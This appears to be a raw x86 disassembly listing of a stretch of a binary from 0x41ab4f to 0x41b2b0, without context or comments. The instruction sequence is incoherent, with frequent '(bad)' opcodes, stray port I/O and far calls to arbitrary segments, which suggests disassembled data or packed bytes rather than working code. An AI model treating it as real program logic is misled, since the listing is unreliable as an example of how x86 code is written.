  41ab4f:	adc    dh,BYTE PTR [edi-0x79]
  41ab52:	sbb    eax,DWORD PTR [esi+0x51f07246]
  41ab58:	int3   
  41ab59:	cs jno 0x41ab31
  41ab5c:	adc    edx,DWORD PTR [eax-0x15]
  41ab5f:	mov    eax,0x10f36aa0
  41ab64:	sbb    al,0x9f
  41ab66:	fmul   QWORD PTR [ebx+esi*4+0x1b]
  41ab6a:	jp     0x41abe8
  41ab6c:	and    ebx,ebx
  41ab6e:	jge    0x41ab61
  41ab70:	ficom  WORD PTR gs:[esi-0x3c339241]
  41ab77:	mov    cs,esi
  41ab79:	mov    ah,0x54
  41ab7b:	mov    eax,0x538c1d56
  41ab80:	out    0x5f,eax
  41ab82:	fisttp WORD PTR [edi]
  41ab84:	out    0x18,al
  41ab86:	into   
  41ab87:	fwait
  41ab88:	ins    DWORD PTR es:[edi],dx
  41ab89:	fimul  WORD PTR ds:0x59401789
  41ab8f:	out    0x26,eax
  41ab91:	addr16 xchg ecx,eax
  41ab93:	cmp    bl,BYTE PTR [esi+ecx*4+0x54e386a0]
  41ab9a:	adc    al,0x28
  41ab9c:	xchg   BYTE PTR [eax-0x40],al
  41ab9f:	fisubr WORD PTR [esi+0x17]
  41aba2:	sub    al,0x2
  41aba4:	into   
  41aba5:	push   ebx
  41aba6:	out    dx,al
  41aba7:	mov    bh,0x9b
  41aba9:	add    esi,edi
  41abab:	into   
  41abac:	sbb    ch,cl
  41abae:	cmc    
  41abaf:	scas   al,BYTE PTR es:[edi]
  41abb0:	jle    0x41abbc
  41abb2:	pusha  
  41abb3:	sbb    al,0x40
  41abb5:	adc    DWORD PTR [ebx-0x2dfff6fa],edx
  41abbb:	adc    eax,0xcb389a79
  41abc0:	xlat   BYTE PTR gs:[ebx]
  41abc2:	xor    eax,0x44ee0732
  41abc7:	retf   
  41abc8:	lock ss inc esi
  41abcb:	mov    eax,DWORD PTR [ebx]
  41abcd:	data16 outs dx,BYTE PTR ds:[esi]
  41abcf:	imul   BYTE PTR [esi-0x6bc2dc1c]
  41abd5:	or     eax,0x94959f71
  41abda:	loope  0x41ac11
  41abdc:	cmp    al,BYTE PTR [eax]
  41abde:	mov    al,ds:0x231f0804
  41abe3:	call   0xb126:0xa8e46817
  41abea:	dec    esi
  41abeb:	(bad)  
  41abec:	in     al,dx
  41abed:	adc    eax,0xed47a7ff
  41abf2:	and    ebx,ebx
  41abf4:	lea    esi,[eax]
  41abf6:	retf   
  41abf7:	call   0x877:0xc667c604
  41abfe:	mov    BYTE PTR [esp+eiz*4-0x3d],ch
  41ac02:	popf   
  41ac03:	and    esp,DWORD PTR [bp+di-0x3e]
  41ac07:	sbb    edx,edx
  41ac09:	aad    0x18
  41ac0b:	sbb    ecx,esi
  41ac0d:	call   0x1063:0xcd8d58e4
  41ac14:	fldpi  
  41ac16:	mov    bl,0xbd
  41ac18:	(bad)  
  41ac1a:	inc    eax
  41ac1b:	pop    edi
  41ac1c:	lods   eax,DWORD PTR ds:[esi]
  41ac1d:	sbb    DWORD PTR ds:[esi],ebp
  41ac20:	inc    esp
  41ac21:	pop    eax
  41ac22:	popa   
  41ac23:	xchg   edx,eax
  41ac24:	(bad)  
  41ac26:	enter  0x83ad,0x32
  41ac2a:	stos   BYTE PTR es:[edi],al
  41ac2b:	xchg   esi,eax
  41ac2c:	in     al,dx
  41ac2d:	adc    ecx,ebx
  41ac2f:	or     eax,DWORD PTR [ebp-0x67]
  41ac32:	pop    ebp
  41ac33:	mov    eax,0xb9ab2405
  41ac38:	or     ecx,edi
  41ac3a:	mov    esp,0x60e2adf5
  41ac3f:	fstp   DWORD PTR [edi]
  41ac41:	pop    eax
  41ac42:	pop    ebx
  41ac43:	jge    0x41ac6a
  41ac45:	and    DWORD PTR es:[ecx+0x43b9ba0f],edi
  41ac4c:	stos   BYTE PTR es:[edi],al
  41ac4d:	pop    esp
  41ac4e:	mov    dh,0xc8
  41ac50:	loopne 0x41ac02
  41ac52:	jle    0x41abe8
  41ac54:	aaa    
  41ac55:	lock jnp 0x41ac57
  41ac58:	jp     0x41ac94
  41ac5a:	dec    BYTE PTR [edi+0x79]
  41ac5d:	dec    eax
  41ac5e:	repz jne 0x41acb9
  41ac61:	daa    
  41ac62:	mov    bh,0xa9
  41ac64:	mov    ah,0x2b
  41ac66:	mov    esi,0x2d082c90
  41ac6b:	iret   
  41ac6c:	movzx  esi,WORD PTR [esi+edx*1]
  41ac70:	add    eax,0x9326921e
  41ac75:	push   cs
  41ac76:	inc    edi
  41ac77:	push   0xe8a27819
  41ac7c:	mov    ss,WORD PTR [ecx+esi*2]
  41ac7f:	adc    al,0x5d
  41ac81:	xchg   ebp,eax
  41ac82:	sbb    al,0x98
  41ac84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac85:	test   eax,0xd0026cc8
  41ac8a:	adc    eax,0x415d33a
  41ac8f:	test   DWORD PTR [ecx],esi
  41ac91:	fcom   DWORD PTR [ecx]
  41ac93:	pop    esi
  41ac94:	pop    ds
  41ac95:	xchg   ebp,eax
  41ac96:	or     BYTE PTR [ebx+0x7b3cef50],bh
  41ac9c:	fcomp  st(0)
  41ac9e:	loopne 0x41ac97
  41aca0:	xor    al,0xba
  41aca2:	mov    cl,0x54
  41aca4:	add    DWORD PTR [esi],edi
  41aca6:	push   edx
  41aca7:	repz sbb eax,0x306eded1
  41acad:	push   edi
  41acae:	push   ebx
  41acaf:	out    dx,al
  41acb0:	arpl   WORD PTR [esi],bx
  41acb2:	stos   BYTE PTR es:[edi],al
  41acb3:	sbb    BYTE PTR [esi+edx*1+0x37],ah
  41acb7:	cmp    DWORD PTR [ecx-0x21],edi
  41acba:	xlat   BYTE PTR ds:[ebx]
  41acbb:	cmc    
  41acbc:	xor    dl,BYTE PTR [ebx]
  41acbe:	jbe    0x41acff
  41acc0:	(bad)  
  41acc1:	sub    eax,0x9792fbce
  41acc6:	mov    ax,ds:0x7a8ebd68
  41accc:	xor    BYTE PTR [ebp+0x6f],ah
  41accf:	ret    0x8e90
  41acd2:	inc    ebx
  41acd3:	cli    
  41acd4:	sbb    DWORD PTR [eax-0x14b81190],0xffffffef
  41acdb:	push   es
  41acdc:	xchg   ebp,eax
  41acdd:	pop    eax
  41acde:	adc    ebp,DWORD PTR ds:0x4aa1dcaf
  41ace4:	fwait
  41ace5:	pusha  
  41ace6:	adc    BYTE PTR [ebx-0x18],dh
  41ace9:	xchg   esi,eax
  41acea:	mov    al,0x98
  41acec:	sub    eax,0x577a4567
  41acf1:	imul   ecx,DWORD PTR [ecx+0x1809bb45],0xffffffa6
  41acf8:	(bad)  
  41acf9:	xor    eax,0x48c7b0fe
  41acfe:	mov    ebp,ecx
  41ad00:	sub    esp,DWORD PTR [ebx+0x5f]
  41ad03:	cmp    ch,BYTE PTR [ebp+0x16]
  41ad06:	push   0x8e3a67a0
  41ad0b:	and    eax,0xd8edf009
  41ad10:	pop    es
  41ad11:	(bad)  
  41ad12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad13:	sub    edi,DWORD PTR [esi]
  41ad15:	stc    
  41ad16:	fdivr  QWORD PTR [eax]
  41ad18:	sbb    BYTE PTR [ecx+ebx*1+0xb],ch
  41ad1c:	push   edi
  41ad1d:	sbb    DWORD PTR [eax+0x145e4f3d],eax
  41ad23:	repz pop esi
  41ad25:	ret    
  41ad26:	or     eax,0xaab7efdb
  41ad2b:	pop    ebp
  41ad2c:	dec    esi
  41ad2d:	out    dx,eax
  41ad2e:	sub    ebp,ebp
  41ad30:	lds    edi,FWORD PTR [edx+0x3103f933]
  41ad36:	mov    ecx,0x90f2810c
  41ad3b:	loopne 0x41acf0
  41ad3d:	or     bl,bh
  41ad3f:	jg     0x41acc1
  41ad41:	dec    esp
  41ad42:	xchg   edi,eax
  41ad43:	lahf   
  41ad44:	inc    ebx
  41ad45:	xchg   edi,eax
  41ad46:	xchg   DWORD PTR [edi+0x41],esp
  41ad49:	cmp    DWORD PTR [esp+eax*2-0x5e],esp
  41ad4d:	sbb    bh,BYTE PTR [ebx-0xb893d70]
  41ad53:	sbb    BYTE PTR [ebp+0xb0ff0b3],dl
  41ad59:	mov    ds:0xbb32abdc,al
  41ad5e:	inc    ecx
  41ad5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad60:	scas   al,BYTE PTR es:[edi]
  41ad61:	out    dx,al
  41ad62:	dec    ebp
  41ad63:	test   dh,ah
  41ad65:	aas    
  41ad66:	mov    eax,ds:0xe2e25537
  41ad6b:	imul   esp,DWORD PTR [eax-0x64],0xffffff8a
  41ad6f:	jbe    0x41ad6d
  41ad71:	pop    ss
  41ad72:	add    DWORD PTR [esi],esp
  41ad74:	jge    0x41ad18
  41ad76:	mov    ch,dl
  41ad78:	or     eax,0x7820215c
  41ad7d:	jge    0x41adc5
  41ad7f:	inc    edx
  41ad80:	cmc    
  41ad81:	xchg   edx,eax
  41ad82:	and    eax,0xabf7ea33
  41ad87:	jbe    0x41ade8
  41ad89:	push   ebx
  41ad8a:	ins    DWORD PTR es:[edi],dx
  41ad8b:	loop   0x41ad5b
  41ad8d:	push   ebp
  41ad8e:	push   edi
  41ad8f:	aas    
  41ad90:	sbb    eax,0x8b30aa54
  41ad95:	and    cl,ah
  41ad97:	mov    esi,0xa31eb8bd
  41ad9c:	dec    esi
  41ad9d:	fiadd  DWORD PTR [ecx+0x110e7209]
  41ada3:	outs   dx,DWORD PTR ds:[esi]
  41ada4:	jns    0x41ad4d
  41ada6:	repz xor edx,esi
  41ada9:	sub    ebp,edx
  41adab:	daa    
  41adac:	js     0x41ad3b
  41adae:	push   ebx
  41adaf:	sbb    BYTE PTR [esp+eax*2+0x56f88cb3],0x88
  41adb7:	ins    BYTE PTR es:[edi],dx
  41adb8:	jl     0x41ad84
  41adba:	pop    ss
  41adbb:	jno    0x41ad75
  41adbd:	sbb    bl,ch
  41adbf:	enter  0x2e1a,0x85
  41adc3:	jne    0x41ade9
  41adc5:	lea    esp,[edx+eax*2-0x3b]
  41adc9:	dec    eax
  41adca:	add    ch,0x15
  41adcd:	ret    0xaa05
  41add0:	(bad)  
  41add1:	leave  
  41add2:	lds    esi,FWORD PTR [ebx+0x7b2c22aa]
  41add8:	jg     0x41ae15
  41adda:	ds sub al,0xe4
  41addd:	adc    dh,ch
  41addf:	leave  
  41ade0:	fstp   TBYTE PTR [ebx-0x5349d65]
  41ade6:	pop    ds
  41ade7:	jb     0x41ad9a
  41ade9:	ja     0x41ae59
  41adeb:	pop    ds
  41adec:	aad    0xfe
  41adee:	and    cl,0xfc
  41adf1:	mov    ebx,0x70f82eb6
  41adf6:	sub    BYTE PTR [edx+0x7ea92883],0xe6
  41adfd:	clc    
  41adfe:	dec    esp
  41adff:	jo     0x41adae
  41ae01:	pop    es
  41ae02:	jae    0x41ae3f
  41ae04:	shr    DWORD PTR [edx],cl
  41ae06:	xor    al,ah
  41ae08:	ret    
  41ae09:	sub    dh,BYTE PTR [edi-0x4a0a15ba]
  41ae0f:	repz adc ah,BYTE PTR [edx+0x2f7b75a1]
  41ae16:	adc    eax,0xdffa286d
  41ae1b:	push   ebp
  41ae1c:	mov    DWORD PTR ds:[ebp+0x2ebd4927],esp
  41ae23:	jge    0x41adcf
  41ae25:	gs arpl sp,cx
  41ae28:	jo     0x41ade6
  41ae2a:	and    al,0x1d
  41ae2c:	jb     0x41adf9
  41ae2e:	sbb    bh,BYTE PTR [ebp+0xc]
  41ae31:	int    0x6e
  41ae33:	inc    esp
  41ae34:	mov    esi,edx
  41ae36:	aaa    
  41ae37:	test   esi,edx
  41ae39:	or     al,0x29
  41ae3b:	push   edx
  41ae3c:	call   0xf4bc4db7
  41ae41:	mov    ch,0x3b
  41ae43:	and    ebp,0x4d1902ce
  41ae49:	(bad)  
  41ae4a:	lods   eax,DWORD PTR ds:[esi]
  41ae4b:	mov    dh,0x67
  41ae4d:	hlt    
  41ae4e:	or     DWORD PTR [eax-0x6631928c],ecx
  41ae54:	fcom   DWORD PTR [ecx]
  41ae56:	cmp    ecx,DWORD PTR [esi+ecx*8+0x75]
  41ae5a:	cs cmp eax,0xf15d3366
  41ae60:	inc    esi
  41ae61:	jp     0x41ae62
  41ae63:	pop    edx
  41ae64:	mov    cl,0x24
  41ae66:	test   BYTE PTR [esi],bl
  41ae68:	cmc    
  41ae69:	cmp    DWORD PTR [esi+0x787a3b66],ebp
  41ae6f:	push   edx
  41ae70:	out    dx,al
  41ae71:	mov    ch,0xe9
  41ae73:	sub    al,dh
  41ae75:	nop
  41ae76:	inc    eax
  41ae77:	adc    eax,0xec7720c1
  41ae7c:	inc    edi
  41ae7d:	lahf   
  41ae7e:	ds popf 
  41ae80:	cwde   
  41ae81:	adc    al,0x22
  41ae83:	repnz adc BYTE PTR [edx-0x59],bl
  41ae87:	outs   dx,DWORD PTR ds:[esi]
  41ae88:	push   0x3c
  41ae8a:	pop    esp
  41ae8b:	addr16 test eax,0x73a70a4d
  41ae91:	mov    al,0xbf
  41ae93:	hlt    
  41ae94:	ins    BYTE PTR es:[edi],dx
  41ae95:	jbe    0x41ae56
  41ae97:	xor    dl,dh
  41ae99:	popa   
  41ae9a:	inc    esp
  41ae9b:	jecxz  0x41aef4
  41ae9d:	mov    al,0x89
  41ae9f:	sbb    ecx,DWORD PTR [ecx]
  41aea1:	imul   edi,DWORD PTR ds:0x757d323b,0xffffffc4
  41aea8:	sbb    DWORD PTR [esi-0x19],0x2fb0567
  41aeaf:	add    dl,0x74
  41aeb2:	mov    ecx,DWORD PTR [edi+0x1c]
  41aeb5:	int    0x2e
  41aeb7:	(bad)  
  41aeb8:	jp     0x41aefd
  41aeba:	pop    esi
  41aebb:	sbb    al,0x4e
  41aebe:	mov    al,ds:0x254621f1
  41aec3:	sbb    eax,0x6f85b170
  41aec8:	arpl   si,sp
  41aeca:	out    dx,al
  41aecb:	inc    edi
  41aecc:	xor    ebp,eax
  41aece:	push   ss
  41aecf:	jo     0x41aed9
  41aed1:	ficomp WORD PTR [ecx-0x1c9d2ed1]
  41aed7:	xor    al,0x17
  41aed9:	pop    edi
  41aeda:	sti    
  41aedb:	or     BYTE PTR [ebx+0x1cb96641],bh
  41aee1:	lock push es
  41aee3:	push   ss
  41aee4:	(bad)  
  41aee5:	cdq    
  41aee6:	sbb    eax,0x63672f01
  41aeeb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeed:	mov    ah,0x1f
  41aeef:	(bad)  
  41aef0:	adc    BYTE PTR [eax-0x39],ah
  41aef3:	bound  edx,QWORD PTR [edi+0x4e]
  41aef6:	and    DWORD PTR [ecx+ebx*1-0x56],edi
  41aefa:	inc    ebp
  41aefb:	iret   
  41aefc:	rcl    DWORD PTR [ebp-0x78],1
  41aeff:	in     al,dx
  41af00:	ds adc eax,0x129cb900
  41af06:	xchg   DWORD PTR [eax],ebp
  41af08:	mov    esp,ds
  41af0a:	add    bl,BYTE PTR [ecx]
  41af0c:	cmp    eax,0xda84b6fa
  41af11:	xchg   esi,ebp
  41af13:	ret    0x5fc3
  41af16:	push   edx
  41af17:	mov    ebx,DWORD PTR [ecx]
  41af19:	dec    ebx
  41af1a:	inc    esp
  41af1b:	and    ebx,ebx
  41af1d:	test   DWORD PTR [ebp-0x74],0xb7731e1f
  41af24:	cmp    DWORD PTR [ebp-0x76],edi
  41af27:	inc    ecx
  41af28:	add    BYTE PTR [ebx+0x2],bl
  41af2b:	test   al,0x2f
  41af2d:	test   dl,dh
  41af2f:	shr    BYTE PTR [eax-0x3fcc0813],1
  41af35:	jmp    0xbbd38d9
  41af3a:	jg     0x41af58
  41af3c:	pop    esp
  41af3d:	test   eax,0xd8e507d1
  41af42:	push   ds
  41af43:	lods   al,BYTE PTR ds:[esi]
  41af44:	mov    eax,0xb2e05496
  41af49:	fnop   
  41af4b:	xor    DWORD PTR [edi],0x35
  41af4e:	das    
  41af4f:	ins    DWORD PTR es:[edi],dx
  41af50:	das    
  41af51:	ficomp WORD PTR ds:0xd01f6de6
  41af57:	push   ebp
  41af58:	mov    edx,0x8f4b0bbc
  41af5d:	scas   eax,DWORD PTR es:[edi]
  41af5e:	iret   
  41af5f:	mov    ebp,0x1cbf1177
  41af64:	jp     0x41af26
  41af66:	or     BYTE PTR [edx],bl
  41af68:	xor    esi,ecx
  41af6a:	ret    0x2e21
  41af6d:	xchg   esp,eax
  41af6e:	push   esi
  41af6f:	frstor [bp+si-0x4b67]
  41af74:	xor    eax,0xa3a4f3df
  41af79:	mov    ds:0x5f33b549,eax
  41af7e:	out    0x1d,eax
  41af80:	dec    edi
  41af81:	or     al,0x94
  41af83:	(bad)  
  41af84:	mov    ebp,0x7dc3e181
  41af89:	pop    ebx
  41af8a:	lock mov esi,0xb23c81c5
  41af90:	push   ebx
  41af91:	int    0x15
  41af93:	push   es
  41af94:	test   eax,0x3a014980
  41af99:	and    al,0xc0
  41af9b:	shl    DWORD PTR [ecx+0x74],1
  41af9e:	dec    ebx
  41af9f:	push   ebx
  41afa0:	or     eax,0x4a4ab1de
  41afa5:	test   al,0xce
  41afa7:	in     al,0x38
  41afa9:	gs sub eax,0x15e5e0ca
  41afaf:	fidivr DWORD PTR [esi+edi*1+0x662cc66]
  41afb6:	es das 
  41afb8:	in     eax,0xdf
  41afba:	leave  
  41afbb:	test   al,0x5d
  41afbd:	test   al,0x2d
  41afbf:	push   0xeca7ea2b
  41afc4:	sbb    eax,0x4bb21a44
  41afc9:	sti    
  41afca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afcb:	rcl    BYTE PTR [eax-0x3f6df503],cl
  41afd1:	push   ss
  41afd2:	aad    0x34
  41afd4:	mov    al,ds:0x7365e143
  41afd9:	add    DWORD PTR [ecx-0x58],ebx
  41afdc:	cmp    DWORD PTR [eax+0x3ec1f062],0x74898952
  41afe6:	bound  edi,QWORD PTR [eax-0x28c16d07]
  41afec:	and    BYTE PTR [edx-0x3071e3cd],ah
  41aff2:	push   cs
  41aff3:	stos   BYTE PTR es:[edi],al
  41aff4:	jecxz  0x41affd
  41aff6:	in     eax,dx
  41aff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aff8:	jmp    0x41b01b
  41affa:	mov    DWORD PTR [eax],esp
  41affc:	sub    ecx,edx
  41affe:	dec    esp
  41afff:	inc    edx
  41b000:	inc    DWORD PTR [ebx+eiz*4+0x3bb7532b]
  41b007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b008:	inc    BYTE PTR [edi]
  41b00a:	test   BYTE PTR [ebx-0x7bae9c7d],cl
  41b010:	sub    bh,0xe9
  41b013:	repz mov esp,0xd7bc2d6b
  41b019:	jbe    0x41b00e
  41b01b:	(bad)  
  41b01c:	cmp    esi,DWORD PTR [esi+0x34]
  41b01f:	fsubr  DWORD PTR [ebx-0x4e]
  41b022:	push   0x58bd2644
  41b027:	mov    al,ds:0xcc0c28d5
  41b02c:	cli    
  41b02d:	retf   0x68f4
  41b030:	xor    esi,DWORD PTR [edx+0x13451971]
  41b036:	jns    0x41b00f
  41b038:	or     esi,edx
  41b03a:	mov    ah,0xbf
  41b03c:	mov    bl,0xfa
  41b03e:	aaa    
  41b03f:	pop    ebp
  41b040:	fucomip st,st(5)
  41b042:	scas   eax,DWORD PTR es:[edi]
  41b043:	das    
  41b044:	inc    ebp
  41b045:	enter  0x1bb2,0xb3
  41b049:	dec    eax
  41b04a:	ins    BYTE PTR es:[edi],dx
  41b04b:	jns    0x41b04f
  41b04d:	(bad)  
  41b04e:	sbb    DWORD PTR [eax+0x3d],ebx
  41b051:	and    BYTE PTR [edi-0xa],dh
  41b054:	or     dh,cl
  41b056:	xchg   edi,eax
  41b057:	dec    ebp
  41b058:	add    ch,al
  41b05a:	inc    eax
  41b05b:	in     al,0xb2
  41b05d:	(bad)  
  41b05e:	ja     0x41afe4
  41b060:	add    cl,dl
  41b062:	jb     0x41b058
  41b064:	in     eax,0xe9
  41b066:	sbb    eax,0x30ea9223
  41b06b:	adc    DWORD PTR [eax+0x13],esi
  41b06e:	xchg   BYTE PTR [ebx+0x69],al
  41b071:	retf   
  41b072:	cmp    al,0x82
  41b074:	loop   0x41b0de
  41b076:	push   edi
  41b077:	xor    al,0x60
  41b079:	div    BYTE PTR [eax-0x7d38a672]
  41b07f:	popf   
  41b080:	mov    bl,0xff
  41b082:	out    dx,eax
  41b083:	mov    dl,BYTE PTR [ebp-0x3073e8e]
  41b089:	cmp    edi,DWORD PTR ds:[ebx-0x4e337e19]
  41b090:	sub    eax,0x6bcbba92
  41b095:	in     eax,dx
  41b096:	sbb    DWORD PTR [ecx],esp
  41b098:	stos   DWORD PTR es:[edi],eax
  41b099:	jbe    0x41b099
  41b09b:	cmp    edx,eax
  41b09d:	mov    ecx,0x2a8a40bc
  41b0a2:	pop    ecx
  41b0a3:	mov    esp,0xbdf1e35c
  41b0a8:	mov    DWORD PTR [ebx+ebp*4-0x7],ecx
  41b0ac:	rol    dl,1
  41b0ae:	stos   DWORD PTR es:[edi],eax
  41b0af:	dec    eax
  41b0b0:	repz scas eax,DWORD PTR es:[edi]
  41b0b2:	jns    0x41b0e6
  41b0b4:	lods   al,BYTE PTR ds:[esi]
  41b0b5:	pop    ds
  41b0b6:	(bad)  
  41b0b7:	fcomp  QWORD PTR [ebp-0x53]
  41b0ba:	imul   edi,DWORD PTR [esi+0x70f93e23],0x45
  41b0c1:	std    
  41b0c2:	sub    BYTE PTR [ebx+0x2f],al
  41b0c5:	arpl   si,sp
  41b0c7:	push   esi
  41b0c8:	mov    WORD PTR [ebx-0x3d],es
  41b0cb:	xchg   BYTE PTR [ecx],ah
  41b0cd:	inc    ebp
  41b0ce:	enter  0xed63,0xbd
  41b0d2:	dec    edx
  41b0d3:	sub    DWORD PTR [edi],edi
  41b0d5:	fidiv  WORD PTR [esi+0x46f4ec78]
  41b0db:	push   esp
  41b0dc:	jmp    0xe8ec:0x27773873
  41b0e3:	outs   dx,DWORD PTR ds:[esi]
  41b0e4:	mov    ebp,0x9acd9d9f
  41b0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ea:	dec    edi
  41b0eb:	inc    esp
  41b0ec:	adc    DWORD PTR [ecx],0xffffff9f
  41b0ef:	push   0x5fd441ec
  41b0f4:	out    0xaf,eax
  41b0f6:	and    al,0x80
  41b0f8:	xchg   esi,eax
  41b0f9:	push   esp
  41b0fa:	stc    
  41b0fb:	push   ebp
  41b0fc:	xchg   BYTE PTR [esi+ecx*1-0x5e],al
  41b100:	rcl    BYTE PTR [ecx-0x8],cl
  41b103:	mov    BYTE PTR [edi+0x2e],ah
  41b106:	or     al,0x1e
  41b108:	mov    edx,0x9b9122e9
  41b10d:	cdq    
  41b10e:	lock mov BYTE PTR [ebp+esi*1+0x37],dh
  41b113:	inc    esi
  41b114:	aad    0xd4
  41b116:	dec    esi
  41b117:	add    eax,0x32a1ec2f
  41b11c:	sbb    edi,ebx
  41b11e:	pop    edi
  41b11f:	push   ecx
  41b120:	xchg   edi,edi
  41b122:	clc    
  41b123:	or     ecx,DWORD PTR [eax+0x3cec872b]
  41b129:	xor    al,0x49
  41b12b:	jg     0x41b1a4
  41b12d:	ss jbe 0x41b14d
  41b130:	mov    ds,WORD PTR [edx]
  41b132:	push   0x98c3ae11
  41b137:	sbb    BYTE PTR [eax+0x43],al
  41b13a:	jle    0x41b121
  41b13c:	or     BYTE PTR [edx-0x274c477f],0x21
  41b143:	dec    ebp
  41b144:	stos   DWORD PTR es:[edi],eax
  41b145:	imul   esi,ecx,0xffffff90
  41b148:	lds    ebp,FWORD PTR [esi+0x64]
  41b14b:	jl     0x41b0e7
  41b14d:	fxch   st(4)
  41b14f:	or     esp,DWORD PTR [edi]
  41b151:	dec    esi
  41b152:	pop    ebp
  41b153:	loope  0x41b0d8
  41b155:	or     DWORD PTR [ebx-0x2b171f85],0x28
  41b15c:	mov    cl,0xd7
  41b15e:	sbb    BYTE PTR [ebp+0x76],dh
  41b161:	or     ch,BYTE PTR [ecx]
  41b163:	adc    DWORD PTR [esi+0xd],esp
  41b166:	(bad)  
  41b167:	push   cs
  41b168:	jns    0x41b13b
  41b16a:	les    ebp,FWORD PTR [eax+0x47]
  41b16d:	in     eax,dx
  41b16e:	scas   al,BYTE PTR es:[edi]
  41b16f:	xchg   ebx,eax
  41b170:	test   eax,0xa0521686
  41b175:	sub    ah,BYTE PTR [edi]
  41b177:	jp     0x41b16f
  41b179:	stc    
  41b17a:	int3   
  41b17b:	loope  0x41b169
  41b17d:	fsubrp st(7),st
  41b17f:	mov    ebp,0x78a4e010
  41b184:	call   0xd268:0x211b289d
  41b18b:	dec    ebx
  41b18c:	test   BYTE PTR [ebx+0x3c],0xe1
  41b190:	and    dh,dl
  41b192:	popf   
  41b193:	js     0x41b214
  41b195:	in     eax,dx
  41b196:	popf   
  41b197:	pop    ebx
  41b198:	inc    ebx
  41b199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b19a:	push   cs
  41b19b:	sbb    eax,DWORD PTR [edi]
  41b19d:	push   0xb1bfca6
  41b1a2:	in     al,dx
  41b1a3:	pop    ebp
  41b1a4:	repz sbb dh,BYTE PTR [ebx]
  41b1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1a8:	outs   dx,BYTE PTR ds:[esi]
  41b1a9:	in     eax,0xdc
  41b1ab:	loope  0x41b1b1
  41b1ad:	outs   dx,BYTE PTR ds:[esi]
  41b1ae:	imul   edx,DWORD PTR [ecx-0x13],0x8385900d
  41b1b5:	mov    edi,0x6d834c2d
  41b1ba:	rol    BYTE PTR [eax],cl
  41b1bc:	xchg   ecx,eax
  41b1bd:	or     DWORD PTR [ebp+0x27],esi
  41b1c0:	pusha  
  41b1c1:	clc    
  41b1c2:	and    cl,ah
  41b1c4:	jns    0x41b16a
  41b1c6:	pop    ebp
  41b1c7:	jmp    edx
  41b1c9:	aad    0x3c
  41b1cb:	push   cs
  41b1cc:	cs mov ah,0xb6
  41b1cf:	jb     0x41b1c9
  41b1d1:	fisub  DWORD PTR [edx]
  41b1d3:	les    ecx,FWORD PTR [edi+0x5a]
  41b1d6:	jg     0x41b245
  41b1d8:	or     eax,0x22afcb10
  41b1dd:	push   ecx
  41b1de:	fs std 
  41b1e0:	rcl    BYTE PTR [ebx],1
  41b1e2:	dec    edi
  41b1e3:	addr16 jl 0x41b1ad
  41b1e6:	rcl    bl,1
  41b1e8:	pop    edi
  41b1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ea:	xor    cl,0xfc
  41b1ed:	jb     0x41b1cf
  41b1ef:	push   ds
  41b1f0:	add    edi,DWORD PTR [edx]
  41b1f2:	xor    eax,0x9227b254
  41b1f7:	fild   WORD PTR [eax+0x5d]
  41b1fa:	(bad)  
  41b1fb:	hlt    
  41b1fc:	mov    bh,0xff
  41b1fe:	inc    edi
  41b1ff:	xchg   ebx,eax
  41b200:	pop    ebp
  41b201:	fst    DWORD PTR [ebp+0x6bde6a47]
  41b207:	and    al,0xa2
  41b209:	sub    bl,0xd5
  41b20c:	mov    ah,0x3f
  41b20e:	adc    eax,0x821ac753
  41b213:	call   0x54e0:0xc32f6130
  41b21a:	(bad)  
  41b21b:	loop   0x41b266
  41b21d:	dec    ebx
  41b21e:	push   esi
  41b21f:	sub    edi,DWORD PTR [esi-0x28]
  41b222:	push   ebp
  41b223:	push   ecx
  41b224:	or     ah,BYTE PTR [ebx]
  41b226:	cmp    DWORD PTR [esi-0x14138f49],eax
  41b22c:	adc    al,0xd
  41b22e:	and    ah,dh
  41b230:	sbb    dh,ah
  41b232:	xchg   esp,eax
  41b233:	xor    BYTE PTR [esi-0x46],0x40
  41b237:	les    ecx,FWORD PTR [edi]
  41b239:	imul   ebp,DWORD PTR [edx-0x56],0x9cfbd2b7
  41b240:	sti    
  41b241:	xchg   ebp,eax
  41b242:	in     eax,dx
  41b243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b244:	mov    edx,0xf7db8ed0
  41b249:	fisub  WORD PTR [esi+0x69e7e481]
  41b24f:	fbstp  TBYTE PTR [ebx+ebx*8]
  41b252:	push   es
  41b253:	cdq    
  41b254:	push   edx
  41b255:	(bad)  
  41b256:	outs   dx,BYTE PTR ds:[esi]
  41b257:	std    
  41b258:	jecxz  0x41b2d1
  41b25a:	pop    es
  41b25b:	test   DWORD PTR [ebp+0x72],ebx
  41b25e:	mov    edx,0xf8c64ec0
  41b263:	clc    
  41b264:	out    dx,eax
  41b265:	add    al,0x1c
  41b267:	and    DWORD PTR [eax],ebx
  41b269:	int    0xfd
  41b26b:	jle    0x41b2e0
  41b26d:	jmp    0x41b200
  41b26f:	jmp    0x41b2de
  41b271:	sub    eax,0x98540da5
  41b276:	in     eax,0x69
  41b278:	jno    0x41b23e
  41b27a:	dec    ebp
  41b27b:	ror    DWORD PTR [edi+0x33],0x8d
  41b27f:	clc    
  41b280:	inc    esi
  41b281:	int3   
  41b282:	sbb    dl,BYTE PTR [esi+0x58da891]
  41b288:	inc    ebx
  41b289:	dec    esp
  41b28a:	or     esp,DWORD PTR [ebp+eiz*4+0x69]
  41b28e:	mov    ebx,0xe06a17c7
  41b293:	fbstp  TBYTE PTR ds:0xd1d70c3f
  41b299:	out    dx,eax
  41b29a:	mov    fs,ebp
  41b29c:	pop    es
  41b29d:	mov    ebp,0xda9bedfc
  41b2a2:	mov    bh,0xb6
  41b2a4:	xor    ebx,eax
  41b2a6:	sub    ecx,esp
  41b2a8:	ds aad 0x37
  41b2ab:	fs dec esi
  41b2ad:	pop    eax
  41b2ae:	rcl    cl,1
  41b2b0:	mov    ebp,0xfe52f0d1
